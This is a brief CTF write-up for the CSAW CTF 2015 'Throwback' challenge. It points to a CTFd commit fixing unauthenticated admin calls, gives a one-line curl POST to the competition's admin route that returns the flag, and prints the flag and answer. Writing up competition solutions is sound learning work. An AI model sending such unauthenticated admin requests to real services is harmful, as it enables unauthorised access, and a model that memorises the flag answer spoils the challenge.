---
author: Hypersonic
comments: true
date: 2015-09-21 11:37+00:00
layout: post
slug: csaw-ctf-throwback
title: CSAW CTF 2015 - Throwback
---

1. We can see a recent bugfix to CTFd, preventing unauthed admin calls at [https://github.com/CTFd/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261](https://github.com/CTFd/CTFd/commit/9578355143d7af675fc4776b0f2de802be91e261).

2. We make a POST request to it with cURL with: `curl -da=a https://ctf.isis.poly.edu/admin/chal/new`.

3. We get back the flag: `flag{at_least_it_isnt_php}`.

4. Unwrap the flag (remove the `flag{}` around it), and we get the solution: `at_least_it_isnt_php`.
